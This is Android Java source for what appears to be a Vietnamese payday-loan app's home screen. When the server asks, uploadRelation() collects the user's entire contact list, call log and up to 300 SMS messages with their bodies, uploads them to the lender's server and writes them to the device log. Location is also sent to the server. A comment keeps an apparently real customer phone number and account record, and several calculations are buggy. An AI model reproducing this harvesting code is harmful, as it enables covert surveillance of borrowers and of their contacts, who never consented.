package com.mofa.loan.activity;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.Typeface;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.support.v4.app.Fragment;
import android.text.TextUtils;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.CompoundButton;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.SeekBar;
import android.widget.TextView;

import com.appsflyer.AFInAppEventParameterName;
import com.appsflyer.AppsFlyerLib;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.mofa.loan.R;
import com.mofa.loan.pojo.Contact;
import com.mofa.loan.pojo.Contact2;
import com.mofa.loan.pojo.SMS;
import com.mofa.loan.utils.AlertDialog;
import com.mofa.loan.utils.Config;
import com.mofa.loan.utils.ConnectionDetector;
import com.mofa.loan.utils.Formatdou;
import com.mofa.loan.utils.HttpUtils;
import com.mofa.loan.utils.LocationUtil;
import com.mofa.loan.utils.LocationUtils;
import com.mofa.loan.utils.MD5Util;
import com.mofa.loan.utils.PermissionUtils;
import com.mofa.loan.utils.ToastUtil;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.lang.ref.WeakReference;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Timer;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class HomeFragment3 extends Fragment implements View.OnClickListener,
        SeekBar.OnSeekBarChangeListener, IndexActivity.callback {

    private View view;
    private String userid;
    private String json = "";
    private int username;
    private int isyhbd;
    private int isshenfen;
    private int isjob;
    private int islianxi, iseducation, isshebao, isschool, isfacebook;
    private String hongbao = "1";
    public static int hongbaoid = 1;
    private String hongbaosj;
    private String hongbaoje;
    private String fxhongbao;
    private String oldhongbao;
    private String hongbaoenddate;
    private String title;
    private int logincount;
    private String hkqd;
    private Activity ac;

    public static String mobilephone;
    private String jkid, cardBank;
    private int wdXiaoXi = 0;
    private int profession;
    private int currentStatus = 1001;

    private TextView tvCredit;
    private TextView tvDescripe;
    private TextView tvLoan;
    private TextView tvDay;
    private TextView tvDay15;
    private TextView tvDay30;
    private SeekBar sbMoney;
    private Button btnLoan;

    public static double oMoney = 2000000;
    public static int days = 15;
    private double day30;
    private double day15;
    private double day30_2;
    private double day15_2;
    private double TSLoanMoney;
    private double inverst15 = 0.0045;
    private double inverst30 = 0.009;

    private MyHandler mHandler;

    final java.text.DecimalFormat df = new java.text.DecimalFormat("#.000000");
    final java.text.DecimalFormat df2 = new java.text.DecimalFormat("#.0");

    private Timer time = new Timer();

    private LocationUtil locations;

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        if (view == null) {
            view = inflater.inflate(R.layout.fragment_home3, container, false);
            initView();
//            initData();
        } else {
            ((ViewGroup) view.getParent()).removeView(view);
        }
        Log.i("MOFA", "HomeFragment2---onCreateView");
        return view;
    }

    private void initView() {
        ac = getActivity();
        mHandler = new MyHandler(ac);
        tvCredit = view.findViewById(R.id.tv_credit);
        tvDescripe = view.findViewById(R.id.tv_description);
        tvLoan = view.findViewById(R.id.tv_loan_money);
        tvDay = view.findViewById(R.id.tv_loan_days);
        tvDay15 = view.findViewById(R.id.tv_15);
        tvDay15.setOnClickListener(this);
        tvDay30 = view.findViewById(R.id.tv_30);
        tvDay30.setOnClickListener(this);
        sbMoney = view.findViewById(R.id.sb_money);
        sbMoney.setOnSeekBarChangeListener(this);
        btnLoan = view.findViewById(R.id.btn_loan);
        btnLoan.setOnClickListener(this);
        btnLoan.setClickable(false);
    }

    private long timeIn;
    private long timeOut;

    @Override
    public void onStart() {
        super.onStart();
        timeIn = System.currentTimeMillis();
        Log.i("MOFA", "HomeFragment2---onStart:" + timeIn);
    }

    @Override
    public void onStop() {
        super.onStop();
        timeOut = System.currentTimeMillis();
        Log.i("MOFA", "HomeFragment2---onStop:" + timeOut);
        Log.i("MOFA", "HomeFragment2---Show:" + (timeOut - timeIn));
    }


    @Override
    public void onClick(View view) {
        //TODO test线上
//        if (true) {
//            Intent intentOther = new Intent(ac,
//                    BackMoney3Activity.class);
//            intentOther.putExtra("jkid", jkid);
//            startActivity(intentOther);
//            return;
//        }
        switch (view.getId()) {
            case R.id.tv_15:
                switchDays(15);
                break;
            case R.id.tv_30:
                switchDays(30);
                break;
            case R.id.btn_loan:
                ConnectionDetector cd = new ConnectionDetector(ac);
                Log.i("MOFA", "当前借款状态：" + currentStatus);
                Log.i("MOFA", "当前按钮文字："
                        + btnLoan.getText().toString().trim());
                if (cd.isConnectingToInternet()) {
                    // check_loan_details: 1001
                    // upload_video: 1002
                    // repay: 1003
                    // waiting_for_the_loan: 1004
                    // loan: 1005
                    switch (currentStatus) {
                        case 1005:
                            String loantext = btnLoan.getText().toString().trim();
                            if (loantext.equalsIgnoreCase(getResources().getString(
                                    R.string.check_repay))) {
                                Intent intentc = new Intent(ac,
                                        OutMoneyRecord3Activity.class);
                                intentc.putExtra("type", "home");
                                startActivity(intentc);
                                return;
                            }

                            if (sbMoney.getProgress() <= 500
                                    && sbMoney.getProgress() > 475) {
                                oMoney = 5000000;
                            } else if (sbMoney.getProgress() <= 475
                                    && sbMoney.getProgress() > 375) {
                                oMoney = 4000000;
                            } else if (sbMoney.getProgress() <= 375
                                    && sbMoney.getProgress() > 275) {
                                oMoney = 3000000;
                            } else if (sbMoney.getProgress() <= 275
                                    && sbMoney.getProgress() > 175) {
                                oMoney = 2000000;
                            } else if (sbMoney.getProgress() <= 175
                                    && sbMoney.getProgress() > 100) {
                                oMoney = 1000000;
                            }
                            if (oMoney < 1000000) {
                                ToastUtil.showShort(
                                        ac,
                                        getResources().getString(
                                                R.string.warm_money_least));
                                return;
                            } else if (oMoney > 5000000) {
                                ToastUtil.showShort(
                                        ac,
                                        getResources().getString(
                                                R.string.warm_money_most));
                                return;
                            } else if (days < 15) {
                                ToastUtil.showShort(
                                        ac,
                                        getResources().getString(
                                                R.string.warm_day_least));
                                return;
                            }
                             if (isyhbd == 1
                             && isshenfen == 1
                             && islianxi == 1
                             && ((isschool == 1 && profession == 1) || (profession ==
                             2 && isjob == 1))) {
                            setLoanDialog();
                             } else {
                             setVerfyDialog();
                             }
                            break;
                        case 1001:
                            Intent intentc = new Intent(ac,
                                    OutMoneyRecord3Activity.class);
                            intentc.putExtra("type", "home");
                            startActivity(intentc);
                            break;
                        case 1002:
                            Intent intentv = new Intent(ac, Camera3Activity.class);
                            intentv.putExtra("jkid", jkid);
                            startActivity(intentv);
                            break;
                        case 1003:
                            Intent intents = new Intent(ac, BackMoney3Activity.class);
                            intents.putExtra("jkid", jkid);
                            startActivity(intents);
                            break;
                        case 1004:
                            Intent intento = new Intent(ac,
                                    OutMoneyRecord3Activity.class);
                            intento.putExtra("type", "home");
                            startActivity(intento);
                            break;
                        default:
                            break;
                    }
                } else {
                    ToastUtil.showShort(ac,
                            getResources().getString(R.string.network_error));

                }

                break;

            default:
                break;
        }
    }

    @Override
    public void onProgressChanged(SeekBar seekBar, int i, boolean b) {
        oMoney = i / 100 * 1000000;
        String money = Formatdou.formatdou(oMoney + "");
        if (i > 500) {
            tvLoan.setText(getResources().getString(R.string.credit_over));
        } else {
            tvLoan.setText(money);
        }
    }

    @Override
    public void onStartTrackingTouch(SeekBar seekBar) {

    }

    @Override
    public void onStopTrackingTouch(SeekBar seekBar) {
        if (sbMoney.getProgress() > 475) {
            sbMoney.setProgress(500);
        } else if (sbMoney.getProgress() <= 475
                && sbMoney.getProgress() > 375) {
            sbMoney.setProgress(400);
        } else if (sbMoney.getProgress() <= 375
                && sbMoney.getProgress() > 275) {
            sbMoney.setProgress(300);
        } else if (sbMoney.getProgress() <= 275
                && sbMoney.getProgress() > 175) {
            sbMoney.setProgress(200);
        } else if (sbMoney.getProgress() <= 175) {
            sbMoney.setProgress(100);
        }
    }

    @Override
    public void getResult(String result) {

    }

    private void uploadRelation(final Context context, final long retaketime) {
        new Thread() {
            public void run() {
                Log.i("MOFA", "-HomeFragment3--CashLoan_打印" + "进入getContact");
                smss = getSmsInPhone(context.getContentResolver(), retaketime);
                list = getContacts(context.getContentResolver(), retaketime);
                list2 = getCallHistoryList2(null, context.getContentResolver(),
                        retaketime);
                JsonArray array = new JsonArray();
                for (int i = 0; i < list.size(); i++) {
                    JsonObject object = new JsonObject();
                    try {
                        String name = list.get(i).getName();
                        String regEx = "[~·`!！@#￥$%^……&*（()）\\-——\\-_=+【\\[\\]】｛{}｝\\|、\\\\；;：:‘'“”\"，,《<。.》>、/？?]";
                        Pattern p = Pattern.compile(regEx);
                        Matcher m = p.matcher(name);
                        name = m.replaceAll("");
                        object.addProperty("showName",
                                URLEncoder.encode(name, "UTF-8"));
                        object.addProperty("phoneNumber", list.get(i)
                                .getPhone());
                        array.add(object);
                    } catch (UnsupportedEncodingException e) {
                        Log.e("MOFA", e.getMessage());
                    }
                }
                JsonArray array2 = new JsonArray();
                for (int i = 0; i < list2.size(); i++) {
                    JsonObject object = new JsonObject();
                    String name = list2.get(i).getName();
                    String regEx = "[~·`!！@#￥$%^……&*（()）\\-——\\-_=+【\\[\\]】｛{}｝\\|、\\\\；;：:‘'“”\"，,《<。.》>、/？?]";
                    Pattern p = Pattern.compile(regEx);
                    Matcher m = p.matcher(name);
                    name = m.replaceAll("");
                    object.addProperty("type", list2.get(i).getType());
                    object.addProperty("name", name);
                    object.addProperty("number", list2.get(i).getNumber());
                    object.addProperty("callDuration", list2.get(i)
                            .getCallDuration());
                    object.addProperty("callDateStr", list2.get(i)
                            .getCallDateStr());
                    array2.add(object);
                }
                JsonArray array3 = new JsonArray();
                String content = "";
                for (int i = 0; i < smss.size(); i++) {
                    JsonObject object = new JsonObject();
                    content = smss.get(i).getContent();
                    if (TextUtils.isEmpty(content)) {
                        content = "111";
                    } else {
                        String regEx = "[~·`!！@#￥$%^……&*（()）\\-——\\-_=+【\\[\\]】｛{}｝\\|、\\\\；;：:‘'“”\"，,《<。.》>、/？?]";
                        Pattern p = Pattern.compile(regEx);
                        Matcher m = p.matcher(content);
                        content = m.replaceAll("");
                    }
                    content = content.replace("%", "%25");
                    object.addProperty("phone", smss.get(i).getPhone());
                    object.addProperty("person", smss.get(i).getPerson());
                    object.addProperty("content", content);
                    object.addProperty("smstime", smss.get(i).getDate());
                    object.addProperty("type", smss.get(i).getType());
                    array3.add(object);
                }
                JsonObject obj = new JsonObject();
                obj.addProperty("userid", userid);
                obj.addProperty("we", MD5Util.md5(userid));
                obj.add("contacts", array);
                obj.add("contacts1", array2);
                obj.add("sms", array3);
                json = obj.toString();
                Log.i("MOFA", "-HomeFragment3--CashLoan_打印" + array.toString());
                Log.i("MOFA", "-HomeFragment3--CashLoan_打印" + json);
                // 上传联系人json数据
                String url2 = Config.URL
                        + "servlet/current/JBDUserAction?function=OLVshangCost";
                HttpUtils.httpPostJSONAsync(url2, json, mHandler);
            }

        }.start();
    }

    /**
     * 利用系统CallLog获取通话历史记录
     *
     * @return
     */
    @SuppressLint("SimpleDateFormat")
    public List<Contact2> getCallHistoryList2(Context context,
                                              ContentResolver cr, long retaketime) {
        List<Contact2> list2 = new ArrayList<Contact2>();
        Cursor cs;
        cs = cr.query(CallLog.Calls.CONTENT_URI, // 系统方式获取通讯录存储地址
                new String[]{CallLog.Calls.CACHED_NAME, // 姓名
                        CallLog.Calls.NUMBER, // 号码
                        CallLog.Calls.TYPE, // 呼入/呼出(2)/未接
                        CallLog.Calls.DATE, // 拨打时间
                        CallLog.Calls.DURATION // 通话时长
                }, null, null, CallLog.Calls.DEFAULT_SORT_ORDER);
        if (cs != null && cs.getCount() > 0) {
            for (cs.moveToFirst(); !cs.isAfterLast(); cs.moveToNext()) {

                Long time = Long.parseLong(cs.getString(3));
                if (time <= retaketime) {
                    continue;
                }

                String callName = cs.getString(0);
                callName = callName == null ? "null" : callName;
                String callNumber = cs.getString(1);
                // 通话类型
                int callType = Integer.parseInt(cs.getString(2));
                String callTypeStr = "";
                switch (callType) {
                    case CallLog.Calls.INCOMING_TYPE:
                        callTypeStr = "call in";
                        break;
                    case CallLog.Calls.OUTGOING_TYPE:
                        callTypeStr = "call out";
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        callTypeStr = "missed";
                        break;
                }
                // 拨打时间
                SimpleDateFormat sdf = new SimpleDateFormat(
                        "yyyy-MM-dd HH:mm:ss");

                Date callDate = new Date(time);
                String callDateStr = sdf.format(callDate);
                // 通话时长
                int callDuration = Integer.parseInt(cs.getString(4));
                Log.i("MOFA", "-HomeFragment3--CashLoan_打印" + callDuration + "");
                Contact2 contact2 = new Contact2(callTypeStr, callName,
                        callNumber, callDuration, callDateStr);
                list2.add(contact2);
            }
        }
        return list2;
    }

    public List<Contact> getContacts(ContentResolver cr, long retaketime) {
        // 联系人的Uri，也就是content://com.android.contacts/contacts
        Uri uri = ContactsContract.Contacts.CONTENT_URI;
        // 指定获取_id和display_name两列数据，display_name即为姓名
        String[] projection = new String[]{ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME};
        // 根据Uri查询相应的ContentProvider，cursor为获取到的数据集
        Cursor cursor = cr.query(uri, projection, null, null, null);
        Contact[] arr = new Contact[cursor.getCount()];
        int i = 0;
        if (cursor != null && cursor.moveToFirst()) {
            do {
                Contact contact = new Contact();
                Long id = cursor.getLong(0);
                // 获取姓名
                String name = cursor.getString(1);
                name = name == null ? "Null" : name;
                name = name.replaceAll("[\"“”]", "-");
                contact.setName(name);
                // 指定获取NUMBER这一列数据
                String[] phoneProjection = new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER};
                // arr[i] = id + " , 姓名：" + name;

                // 根据联系人的ID获取此人的电话号码
                Cursor phonesCusor = cr.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        phoneProjection,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "="
                                + id, null, null);

                // 因为每个联系人可能有多个电话号码，所以需要遍历
                if (phonesCusor != null && phonesCusor.moveToFirst()) {
                    String num = "";
                    do {
                        // String num2 = phonesCusor.getString(0);
                        // arr[i] += " , 电话号码：" + num;
                        // num += "/" + num;
                        num += "/" + phonesCusor.getString(0);
                    } while (phonesCusor.moveToNext());
                    contact.setPhone(num);
                }
                arr[i] = contact;
                i++;
                if (phonesCusor != null) {
                    if (!phonesCusor.isClosed())
                        phonesCusor.close();
                }
            } while (cursor.moveToNext());
        }
        if (cursor != null) {
            if (!cursor.isClosed())
                cursor.close();
        }

        return Arrays.asList(arr);
    }

    public List<SMS> getSmsInPhone(ContentResolver cr, long retaketime) {
        List<SMS> smss = new ArrayList<SMS>();

        try {
            Uri uri = Uri.parse("content://sms/");
            String[] projection = new String[]{"_id", "address", "person",
                    "body", "date", "type"};
            Cursor cur = cr.query(uri, projection, null, null, "date desc"); // 获取手机内部短信

            if (cur.moveToFirst()) {
                int index_Address = cur.getColumnIndex("address");
                int index_Person = cur.getColumnIndex("person");
                int index_Body = cur.getColumnIndex("body");
                int index_Date = cur.getColumnIndex("date");
                int index_Type = cur.getColumnIndex("type");
                int count = 0;
                do {
                    long longDate = cur.getLong(index_Date);
                    if (longDate <= retaketime) {
                        continue;
                    }
                    String strAddress = cur.getString(index_Address);
                    int intPerson = cur.getInt(index_Person);
                    String strbody = cur.getString(index_Body);
                    int intType = cur.getInt(index_Type);

                    SimpleDateFormat dateFormat = new SimpleDateFormat(
                            "yyyy-MM-dd hh:mm:ss");
                    Date d = new Date(longDate);
                    String strDate = dateFormat.format(d);

                    String strType = "";
                    if (intType == 1) {
                        strType = "receive";
                    } else if (intType == 2) {
                        strType = "send";
                    } else {
                        strType = "none";
                    }

                    SMS sms = new SMS(strAddress, intPerson, strbody, strDate,
                            strType);
                    smss.add(sms);
                    count++;
                    if (count == 300) {
                        break;
                    }
                } while (cur.moveToNext());

                if (!cur.isClosed()) {
                    cur.close();
                    cur = null;
                }
            } else {

            } // end if

        } catch (SQLiteException ex) {
            Log.i("MOFA", ex.getMessage());
        }

        return smss;
    }

    private List<Contact> list;
    private List<Contact2> list2;
    private List<SMS> smss;

    private class MyHandler extends Handler {
        private int one;
        private int two;
        private int three;

        private WeakReference<Activity> activityWeakReference;

        public MyHandler(Activity activity) {
            activityWeakReference = new WeakReference<>(activity);
        }

        @Override
        public void handleMessage(Message msg) {
            String reString = msg.obj.toString();
            switch (msg.what) {
                case 1110:
                    Bitmap bitmap = (Bitmap) msg.obj;
                    showHongbao(bitmap, title);
                    break;
                case 200:
                    double Latitude = Double.valueOf(reString.split(":")[0]);
                    double Longitude = Double.valueOf(reString.split(":")[1]);
                    String Url = Config.GETLOCATION
                            + "&userid=" + userid + "&dwlat=" + df.format(Latitude)
                            + "&dwlng=" + df.format(Longitude) + "&hjk="
                            + MD5Util.md5(userid);
                    HttpUtils.doGetAsyn(Url, mHandler, Config.CODE_GET_LOCATION);
                    Log.i("MOFA",
                            "HomeFragment3--LOCATION" + "纬度=" + df.format(Latitude)
                                    + "; 经度=" + df.format(Longitude));
                    if (locations != null) {
                        locations.cancleListener();
                    }
                    break;
                case 201:
                    double Latitude2 = Double.valueOf(reString.split(":")[0]);
                    double Longitude2 = Double.valueOf(reString.split(":")[1]);
                    String Url2 = Config.GETLOCATION
                            + "&userid=" + userid + "&dwlat="
                            + df.format(Latitude2) + "&dwlng="
                            + df.format(Longitude2) + "&hjk=" + MD5Util.md5(userid);
                    HttpUtils.doGetAsyn(Url2, mHandler, Config.CODE_GET_LOCATION);
                    Log.i("MOFA",
                            "HomeFragment3--LOCATION" + "纬度=" + df.format(Latitude2)
                                    + "; 经度=" + df.format(Longitude2));
                    if (locations != null) {
                        locations.cancleListener();
                    }
                    break;
                case Config.CODE_GET_LOCATION:
                    try {
                        JSONObject obj = new JSONObject(reString);
                        if (obj.getInt("error") == 0) {
                            Log.i("MOFA", "-HomeFragment3-" + obj.getString("msg"));
                        }
                        Log.i("MOFA", "-HomeFragment3-" + "error != 0");
                        LocationUtils.unRegisterListener(activityWeakReference.get());
                    } catch (JSONException e) {
                        Log.e("MOFA", e.getMessage() + "---CODE_GET_LOCATION");
                    }
                    break;
                case Config.CODE_IWANTMONEY:
                    try {
                        JSONObject jsonObject = new JSONObject(reString);
                        int ero = jsonObject.getInt("err");
                        ToastUtil.showShort(activityWeakReference.get(), jsonObject.getString("msg"));
                        Log.i("MOFA",
                                "-HomeFragment3-" + jsonObject.getString("msg"));
                        if (ero == 1) {
                            Intent intent = new Intent(activityWeakReference.get(),
                                    OutMoneyRecord3Activity.class);
                            intent.putExtra("type", "wantmoney");
                            startActivity(intent);
                            Log.i("MOFA", "成功借款");
                            Map<String, Object> eventValues = new HashMap<>();
                            eventValues.put("Loan", "ture");
                            eventValues.put(AFInAppEventParameterName.REVENUE, "" + oMoney * 1000000);
                            eventValues.put(AFInAppEventParameterName.CURRENCY, "VND");
                            AppsFlyerLib.getInstance().trackEvent(activityWeakReference.get(), "Loan",
                                    eventValues);
                        }
                        // else {
                        // Toast.makeText(IWantMoneyActivity.this,
                        // jsonObject.getString("msg"), Toast.LENGTH_LONG).show();
                        // }
                    } catch (JSONException e) {
                        Log.e("MOFA", e.getMessage());
                    }

                    break;
                case Config.CODE_HOME_INIT:

                    try {
                        // doGet:{"isshebao":"0","isschool":"0","phone":"18682***84","p3":"118845=1514429843797","p2":"118845=1514429841273",
                        // "p1":"118845=1514429837110","istaobaoyz":"0","islianxi":"0","profession":"1","mobilephone":"18682387884",
                        // "username":"LLD118845","isyhbd":"0","wdXiaoXi":0,"rzcard2":"","isyyshang":"0","rzstatus":"0","sfzmrz":"0",
                        // "lastdate":"2017-12-27 17:24:42.0","s3":"","rzcard":"","s2":"","s1":"","invest_status":"0","dataJK":null,
                        // "w3":"","w1":"","w2":"","isjingdongyz":"0","creditlimit":"5000","isshenfen":"1","err":0,"isjob":"0",
                        // "iseducation":"0","usablecreditlimit":"500","rzname":""}
                        JSONObject jsonObject = new JSONObject(reString);

                        if ("1".equals(jsonObject.getString("appflyer"))) {
                            Map<String, Object> eventValues = new HashMap<>();
                            eventValues.put("Loanbyserver", "ture");
                            eventValues.put(AFInAppEventParameterName.REVENUE, jsonObject.getString("appflyermoney"));
                            eventValues.put(AFInAppEventParameterName.CURRENCY, "VND");
                            AppsFlyerLib.getInstance().trackEvent(activityWeakReference.get(), "Loanbyserver",
                                    eventValues);
                        }
                        // "dataJK":{"id":8,"cl03_status":0,"yuq_ts":null,"cl_status":0,"sjds_money":420,"sjsh_money":600,"cl02_status":0,"jk_money":800}
                        // sfzmrz =
                        // Integer.parseInt(jsonObject.getString("sfzmrz"));
                        isyhbd = Integer.parseInt(jsonObject.getString("isyhbd"));
                        isshenfen = Integer.parseInt(jsonObject
                                .getString("isshenfen"));
                        isjob = Integer.parseInt(jsonObject.getString("isjob"));
                        islianxi = Integer.parseInt(jsonObject
                                .getString("islianxi"));
                        isshebao = Integer.parseInt(jsonObject
                                .getString("isshebao"));// istaobaoyz isjingdongyz
                        // isyyshang
                        isschool = Integer.parseInt(jsonObject
                                .getString("isschool"));
                        isfacebook = Integer.parseInt(jsonObject
                                .getString("isfacebook"));
                        iseducation = Integer.parseInt(jsonObject
                                .getString("iseducation"));

                        hongbao = jsonObject.getString("hongbao");
                        hongbaosj = jsonObject.getString("hongbaosj");
                        oldhongbao = jsonObject.getString("oldhongbao");
                        hongbaoenddate = jsonObject.getString("hongbaoenddate");
                        fxhongbao = jsonObject.getString("fxhongbao");

                        hongbaoje = jsonObject.getString("hongbaoje");

                        profession = Integer.parseInt(jsonObject
                                .getString("profession"));
                        mobilephone = jsonObject.getString("mobilephone");
                        cardBank = jsonObject.getString("rzcard");
                        hkqd = jsonObject.getString("hkqd");
                        logincount = jsonObject.getInt("logincount");

                        Log.i("MOFA", "logincount:" + logincount);

                        // if (logincount == 0) {
                        // showHongbao();
                        // }

                        day30 = Double.valueOf(jsonObject.getString("day30"));
                        day15 = Double.valueOf(jsonObject.getString("day15"));
                        day30_2 = Double.valueOf(jsonObject.getString("TSday30"));
                        day15_2 = Double.valueOf(jsonObject.getString("TSday15"));
                        TSLoanMoney = Double.valueOf(jsonObject.getString("TSdayJE"));

                        // if (true) {
                        if ("1".equalsIgnoreCase(jsonObject
                                .getString("shownofition"))) {
                            String nofitionUrl = Config.SHOWNOFITION_CODE;

                            Log.i("MOFA", "显示图片通知");
                            title = jsonObject.getString("showtitle");
                            getHttpBitmap(nofitionUrl);
                        } else if ("2".equalsIgnoreCase(jsonObject
                                .getString("shownofition"))) {
                            title = jsonObject.getString("showtitle");
                            Log.i("MOFA", "只显示文字通知");
                            showHongbao(null, title);
                        }

                        String sfsex = jsonObject.getString("sfsex");
                        String sfhomeaddress = jsonObject
                                .getString("sfhomeaddress");
                        String sfage = jsonObject.getString("sfage");
                        String sfaddress = jsonObject.getString("sfaddress");
                        String sfemail = jsonObject.getString("sfemail");
                        String sfphonetype = jsonObject.getString("sfphonetype");
                        String sfname = jsonObject.getString("rzbankname");
                        String sfcmnd = jsonObject.getString("rzcard2");
                        // refuseDate = Long.valueOf(jsonObject.getString("date2"));
                        // systemDate = Long.valueOf(jsonObject.getString("date1"));
                        SharedPreferences sp = ac.getSharedPreferences("config",
                                Context.MODE_PRIVATE);
                        SharedPreferences.Editor editor = sp.edit();
                        editor.putInt("isBackMoney", 0);
                        // editor.putString("sfname", "");
                        // editor.putString("sfcmnd", "");
                        // editor.putString("sfsex", "");
                        // editor.putString("sfage", "");
                        // editor.putString("sfhomeaddress", "");
                        // editor.putString("sfaddress", "");
                        // editor.putString("sfemail", "");
                        // editor.putString("sfphonetype", "");
                        editor.putString("sfname", sfname);
                        editor.putString("sfcmnd", sfcmnd);
                        editor.putString("sfsex", sfsex);
                        editor.putString("sfage", sfage);
                        editor.putString("sfhomeaddress", sfhomeaddress);
                        editor.putString("sfaddress", sfaddress);
                        editor.putString("sfemail", sfemail);
                        editor.putString("sfphonetype", sfphonetype);

                        editor.putString("hongbaoje", hongbaoje);

                        editor.putString("bankname2",
                                jsonObject.getString("rzbankname"));

                        editor.putString("facebookname",
                                jsonObject.getString("facebookname"));
                        editor.putString("facebookpictureUrl",
                                jsonObject.getString("facebookpic"));

                        long retaketime = jsonObject.getLong("retaketime");
                        editor.putLong("retaketime", retaketime);
                        if (jsonObject.getInt("retake") == 1) {// 15天后重新获取通讯录
                            // if (true) {//15天后重新获取通讯录
                            if (Build.VERSION.SDK_INT >= 23) {
                                if (ac.checkSelfPermission(android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED
                                        || ac.checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED
                                        || ac.checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                                    // 申请权限 第二个参数是一个 数组 说明可以同时申请多个权限
                                    ac.requestPermissions(
                                            new String[]{
                                                    android.Manifest.permission.READ_CONTACTS,
                                                    android.Manifest.permission.READ_CALL_LOG,
                                                    android.Manifest.permission.READ_SMS},
                                            PermissionUtils.READ_CONTACT_PERMISSION);
                                } else {// 已授权
                                    Log.i("MOFA", "-HomeFragment3--CashLoan_打印"
                                            + "进入getContact === tag>=23 已授权");
                                    uploadRelation(activityWeakReference.get(), retaketime);
                                }
                            } else {
                                Log.i("MOFA", "-HomeFragment3--CashLoan_打印"
                                        + "进入getContact === tag<=23 已授权");
                                uploadRelation(activityWeakReference.get(), retaketime);
                            }
                        }

//                        wdXiaoXi = jsonObject.getInt("wdXiaoXi");
//                        if (wdXiaoXi == 1) {
//                            ivNews.setImageResource(R.drawable.message2);
//                        } else {
//                            ivNews.setImageResource(R.drawable.message);
//                        }
                        if (jsonObject.getString("dataJK") == "null") {
                            btnLoan.setText(getResources().getString(
                                    R.string.loan));
                            tvCredit.setText(jsonObject.getString("creditlimit"));
                            currentStatus = 1005;
                        } else {
                            JSONObject dataJK = jsonObject.getJSONObject("dataJK");
                            if (dataJK.length() == 0) {
                                btnLoan.setText(getResources().getString(
                                        R.string.loan));
                                currentStatus = 1005;
                            } else {
                                one = dataJK.getInt("cl_status");
                                two = dataJK.getInt("cl02_status");
                                three = dataJK.getInt("cl03_status");
                                int spzt = dataJK.getInt("spzt");
                                int sfyfk = dataJK.getInt("sfyfk");
                                // check_loan_details: 1001
                                // upload_video: 1002
                                // repay: 1003
                                // waiting_for_the_loan: 1004
                                // loan: 1005
                                if (one == 0) {
                                    btnLoan.setText(getResources().getString(
                                            R.string.check_loan_details));
                                    currentStatus = 1001;
                                } else if (one == 1 && two == 1 && three == 0
                                        && spzt == 0) {
                                    btnLoan.setText(getResources().getString(
                                            R.string.upload_video));
                                    currentStatus = 1002;
                                } else if (one == 1 && two == 1 && three == 1
                                        && spzt == 1 && sfyfk == 1) {
                                    currentStatus = 1005;
                                    if (!"0".equalsIgnoreCase(hkqd)) {
                                        btnLoan.setText(getResources()
                                                .getString(R.string.check_repay));
                                    } else {
                                        btnLoan.setText(getResources()
                                                .getString(R.string.repay));
                                        currentStatus = 1003;
                                        editor.putInt("isBackMoney", 1);
                                    }
                                } else if (one == 1 && two == 1 && three == 1
                                        && spzt == 1 && sfyfk == 2) {
                                    btnLoan.setText(getResources().getString(
                                            R.string.waiting_for_the_loan));
                                    currentStatus = 1004;
                                } else if (one == 1 && two == 0) {
                                    btnLoan.setText(getResources().getString(
                                            R.string.check_loan_details));
                                    currentStatus = 1001;
                                } else if (one == 1 && two == 1 && three == 0) {
                                    btnLoan.setText(getResources().getString(
                                            R.string.check_loan_details));
                                    currentStatus = 1001;
                                } else if (one == 1 && two == 1 && spzt == 1) {
                                    btnLoan.setText(getResources().getString(
                                            R.string.check_loan_details));
                                    currentStatus = 1001;
                                } else if (one == 3 || two == 3) {
                                    btnLoan.setText(getResources().getString(
                                            R.string.loan));
                                    currentStatus = 1005;
                                }
                                // else if (one == 1&& two == 1&& three == 3) {
                                // btnLoan.setText("上传视频");
                                // }
                                if (one == 1 && two == 1 && three == 1 && spzt == 1
                                        && sfyfk == 1) {
                                    tvCredit.setText(dataJK
                                            .getString("sjsh_money"));
                                    tvDescripe.setText(getResources().getString(
                                            R.string.should_back_loan2));
                                } else if (one == 1 && two == 1) {
                                    tvCredit.setText(dataJK
                                            .getString("sjsh_money"));
                                    tvDescripe.setText(getResources().getString(
                                            R.string.approve_the_amount));
                                } else {
                                    tvCredit.setText(jsonObject
                                            .getString("creditlimit"));
                                    tvDescripe.setText(getResources().getString(
                                            R.string.loan_amount));
                                }
                            }
                            jkid = dataJK.getInt("id") + "";

                        }

                        // editor.putString("hongbao", hongbao);
                        // editor.putString("hongbaosj", hongbaosj);
                        // editor.putString("oldhongbao", oldhongbao);
                        // editor.putString("hongbaoenddate", hongbaoenddate);
                        // editor.putString("fxhongbao", fxhongbao);

                        editor.putInt("isyhbd", isyhbd);
                        editor.putInt("isshenfen", isshenfen);
                        editor.putInt("islianxi", islianxi);
                        editor.putInt("isschool", isschool);
                        editor.putInt("iseducation", iseducation);
